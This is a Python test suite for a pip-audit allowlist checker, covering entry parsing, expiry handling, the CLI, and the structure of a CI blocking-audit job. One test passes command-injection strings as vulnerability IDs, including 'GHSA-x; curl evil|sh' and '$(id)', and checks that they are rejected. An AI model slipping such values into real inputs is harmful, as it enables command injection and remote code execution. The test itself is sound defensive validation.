"""OPS-1: the pip-audit allowlist checker and the blocking-audit workflow wiring.

The blocking audit's logic lives in harness.audit_allowlist so it can be tested here; the
workflow YAML itself only runs in CI and is verified structurally below, never executed.
Expiry is exercised with an injected `today`; the committed allowlist is checked for
structure only, so an entry expiring never turns an unrelated pull request red (that is
the blocking job's job on main and tags).
"""
import contextlib
import copy
import datetime as dt
import io
import tempfile
import unittest
from pathlib import Path

import yaml

from harness import audit_allowlist as al

ROOT = Path(__file__).resolve().parent.parent
WORKFLOW = ROOT / ".github" / "workflows" / "ci.yml"
TODAY = dt.date(2026, 11, 20)

ENTRY = '''
[[ignore]]
id = "GHSA-aaaa-bbbb-cccc"
package = "example"
owner = "arthur"
reason = "not reachable from the harness; tracked in the backlog"
expires = {expires}
'''


def entry(expires="2026-12-31", **overrides):
    """An [[ignore]] table; `expires` is pasted raw (quote it for a TOML string), and a
    keyword replaces that field, or removes it when None."""
    text = ENTRY.format(expires=expires if expires is not None else '"placeholder"')
    if expires is None:
        overrides["expires"] = None
    for key, value in overrides.items():
        text = "\n".join(
            "" if line.startswith(f"{key} =") else line for line in text.splitlines())
        if value is not None:
            text += f'\n{key} = "{value}"'
    return text


class ParseTests(unittest.TestCase):
    def test_a_complete_future_entry_is_accepted(self):
        entries, problems = al.parse(entry("2026-12-31"), TODAY)
        self.assertEqual(problems, [])
        self.assertEqual(len(entries), 1)
        self.assertEqual((entries[0].id, entries[0].owner, entries[0].expires),
                         ("GHSA-aaaa-bbbb-cccc", "arthur", dt.date(2026, 12, 31)))
        self.assertEqual(al.ignore_args(entries), ["--ignore-vuln", "GHSA-aaaa-bbbb-cccc"])

    def test_an_expired_entry_fails_the_check(self):
        entries, problems = al.parse(entry("2026-11-19"), TODAY)
        self.assertEqual(entries, [], "an expired entry must not suppress anything")
        self.assertEqual(len(problems), 1)
        self.assertIn("GHSA-aaaa-bbbb-cccc", problems[0])
        self.assertIn("expired on 2026-11-19", problems[0])

    def test_the_expiry_day_itself_is_still_valid_and_control_for_the_expired_case(self):
        # Negative control: identical entry, expiry today / tomorrow -> accepted.
        for expires in ("2026-11-20", "2026-11-21"):
            entries, problems = al.parse(entry(expires), TODAY)
            self.assertEqual((len(entries), problems), (1, []), expires)

    def test_each_required_field_is_required(self):
        for field in al.FIELDS:
            with self.subTest(field=field):
                _, problems = al.parse(entry(**{field: None}), TODAY)
                self.assertTrue(any(f"`{field}`" in p for p in problems), problems)

    def test_blank_owner_or_reason_is_rejected(self):
        for field in ("owner", "reason"):
            with self.subTest(field=field):
                _, problems = al.parse(entry(**{field: "   "}), TODAY)
                self.assertTrue(any(f"`{field}`" in p for p in problems), problems)

    def test_bad_dates_are_rejected(self):
        for expires in ('"2027-13-45"', '"someday"', "2027-02-01T10:00:00Z", "20271"):
            with self.subTest(expires=expires):
                entries, problems = al.parse(entry(expires), TODAY)
                self.assertEqual(entries, [])
                self.assertTrue(any("expires" in p for p in problems), problems)

    def test_a_quoted_iso_date_is_accepted(self):
        entries, problems = al.parse(entry('"2027-02-01"'), TODAY)
        self.assertEqual((len(entries), problems), (1, []))

    def test_unknown_keys_and_duplicates_are_rejected(self):
        _, problems = al.parse(entry() + '\nexpiry = "2027-01-01"', TODAY)
        self.assertTrue(any("unknown key 'expiry'" in p for p in problems), problems)
        _, problems = al.parse(entry() + entry(), TODAY)
        self.assertTrue(any("duplicate id" in p for p in problems), problems)
        _, problems = al.parse('[[allow]]\nid = "x"\n', TODAY)
        self.assertTrue(any("unknown top-level key 'allow'" in p for p in problems), problems)

    def test_ids_that_could_inject_into_a_command_line_are_rejected(self):
        for ident in ("GHSA-x; curl evil|sh", "$(id)", "a b", "--ignore-vuln", "`id`", "x\\ny", ""):
            with self.subTest(ident=ident):
                entries, problems = al.parse(entry(id=ident), TODAY)
                self.assertEqual(entries, [])
                self.assertTrue(problems, ident)

    def test_invalid_toml_raises_with_a_problem(self):
        with self.assertRaises(al.AllowlistError) as caught:
            al.parse("[[ignore]\nid=", TODAY)
        self.assertIn("not valid TOML", caught.exception.problems[0])

    def test_an_empty_allowlist_is_valid(self):
        self.assertEqual(al.parse("# nothing accepted\n", TODAY), ([], []))


class CommandLineTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.path = Path(self._tmp.name) / "allowlist.toml"

    def run_main(self, text, command="check", today="2026-11-20"):
        self.path.write_text(text, encoding="utf-8")
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = al.main([command, str(self.path), "--today", today])
        return code, out.getvalue().strip(), err.getvalue()

    def test_check_exits_1_on_an_expired_entry_and_names_it(self):
        code, out, err = self.run_main(entry("2026-11-19"))
        self.assertEqual((code, out), (1, ""))
        self.assertIn("GHSA-aaaa-bbbb-cccc", err)
        self.assertIn("expired", err)

    def test_check_passes_when_the_same_entry_is_not_expired(self):
        # Control for the test above: only the date differs.
        code, out, err = self.run_main(entry("2026-11-19"), today="2026-11-18")
        self.assertEqual((code, err), (0, ""))
        self.assertIn("1 entry", out)

    def test_ignore_args_prints_nothing_when_an_entry_is_expired(self):
        # A stale accepted risk must fail the audit job, not silently keep suppressing.
        code, out, err = self.run_main(entry("2026-11-19"), command="ignore-args")
        self.assertEqual((code, out), (1, ""))
        self.assertIn("expired", err)

    def test_ignore_args_lists_every_live_entry(self):
        second = entry("2027-03-01").replace("GHSA-aaaa-bbbb-cccc", "CVE-2026-1234")
        code, out, _ = self.run_main(entry() + second, command="ignore-args")
        self.assertEqual(code, 0)
        self.assertEqual(out, "--ignore-vuln GHSA-aaaa-bbbb-cccc --ignore-vuln CVE-2026-1234")

    def test_empty_allowlist_prints_no_ignore_flags(self):
        code, out, _ = self.run_main("", command="ignore-args")
        self.assertEqual((code, out), (0, ""))

    def test_missing_file_and_invalid_toml_fail_closed(self):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            self.assertEqual(al.main(["check", str(self.path.with_name("absent.toml"))]), 1)
        self.assertIn("cannot read", err.getvalue())
        code, _, err = self.run_main("[[ignore]\n")
        self.assertEqual(code, 1)
        self.assertIn("not valid TOML", err)


class CommittedAllowlistTests(unittest.TestCase):
    def test_the_committed_file_is_structurally_valid(self):
        # today=1970 so expiry never decides this test: an entry running out is caught by the
        # blocking job on main/tags, not by an unrelated pull request.
        entries, problems = al.load(al.ALLOWLIST_PATH, today=dt.date(1970, 1, 1))
        self.assertEqual(problems, [])
        for item in entries:
            self.assertTrue(item.owner and item.reason)

    def test_the_default_path_is_the_one_the_workflow_uses(self):
        self.assertEqual(al.ALLOWLIST_PATH, ROOT / ".github" / "pip-audit-allowlist.toml")
        self.assertTrue(al.ALLOWLIST_PATH.is_file())


def blocking_audit_problems(jobs):
    """Structural defects of the blocking-audit job (empty when it is wired correctly)."""
    problems = []
    job = jobs.get("dependency-audit-blocking")
    if job is None:
        return ["no dependency-audit-blocking job"]
    condition = str(job.get("if", ""))
    if "refs/heads/main" not in condition or "refs/tags/v" not in condition:
        problems.append("job is not limited to main and v* tags")
    if "pull_request" in condition or "github.event_name == 'push'" not in condition:
        problems.append("job must run on push events only")
    if job.get("continue-on-error"):
        problems.append("job-level continue-on-error")
    steps = job.get("steps", [])
    for step in steps:
        if step.get("continue-on-error"):
            problems.append(f"step {step.get('name')!r} has continue-on-error")
    scripts = [step.get("run", "") for step in steps]
    joined = "\n".join(scripts)
    check_at = next((i for i, s in enumerate(scripts) if "harness.audit_allowlist check" in s), None)
    audit_at = next((i for i, s in enumerate(scripts) if "pip-audit -r harness/requirements.lock" in s), None)
    if check_at is None:
        problems.append("no allowlist check step")
    if audit_at is None:
        problems.append("no pip-audit step")
    elif check_at is not None and check_at > audit_at:
        problems.append("allowlist is checked after the audit")
    if "harness.audit_allowlist ignore-args" not in joined or "$IGNORES" not in joined:
        problems.append("audit does not take its ignore list from the allowlist checker")
    if "set -euo pipefail" not in joined:
        problems.append("audit step does not fail on a failed command substitution")
    sbom = [s for s in steps if "supply_chain sbom" in s.get("run", "")]
    if not sbom or "refs/tags/v" not in str(sbom[0].get("if", "")):
        problems.append("no tag-only SBOM step")
    return problems


class BlockingAuditWorkflowTests(unittest.TestCase):
    def setUp(self):
        self.jobs = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))["jobs"]

    def test_the_committed_workflow_is_wired_as_a_blocking_gate(self):
        self.assertEqual(blocking_audit_problems(self.jobs), [])

    def test_the_pull_request_audit_stays_advisory(self):
        steps = self.jobs["dependency-audit"]["steps"]
        audit = [s for s in steps if "pip-audit -r harness/requirements.lock" in s.get("run", "")]
        self.assertEqual(len(audit), 1)
        self.assertTrue(audit[0].get("continue-on-error"))
        self.assertNotIn("if", self.jobs["dependency-audit"])

    def test_the_blocking_job_does_not_gate_pull_requests(self):
        self.assertIn("github.event_name == 'push'", str(self.jobs["dependency-audit-blocking"]["if"]))

    def mutate(self, edit):
        jobs = copy.deepcopy(self.jobs)
        edit(jobs["dependency-audit-blocking"])
        return blocking_audit_problems(jobs)

    def test_the_checker_catches_each_way_to_make_the_gate_advisory_again(self):
        # Negative controls: each edit silently turns the blocking gate back into a no-op.
        def advisory_step(job):
            next(s for s in job["steps"] if "pip-audit -r" in s.get("run", ""))["continue-on-error"] = True

        def advisory_job(job):
            job["continue-on-error"] = True

        def on_pull_requests(job):
            job["if"] = "github.event_name == 'pull_request'"

        def no_main(job):
            job["if"] = "github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')"

        def drop_check(job):
            job["steps"] = [s for s in job["steps"] if "audit_allowlist check" not in s.get("run", "")]

        def drop_ignores(job):
            for s in job["steps"]:
                s["run"] = s.get("run", "").replace("$IGNORES", "")

        def sbom_every_run(job):
            next(s for s in job["steps"] if "supply_chain sbom" in s.get("run", "")).pop("if")

        for edit, expected in (
                (advisory_step, "continue-on-error"), (advisory_job, "job-level continue-on-error"),
                (on_pull_requests, "push events only"), (no_main, "main and v* tags"),
                (drop_check, "no allowlist check step"), (drop_ignores, "ignore list"),
                (sbom_every_run, "tag-only SBOM")):
            with self.subTest(edit=edit.__name__):
                problems = self.mutate(edit)
                self.assertTrue(any(expected in p for p in problems), problems)


if __name__ == "__main__":
    unittest.main()
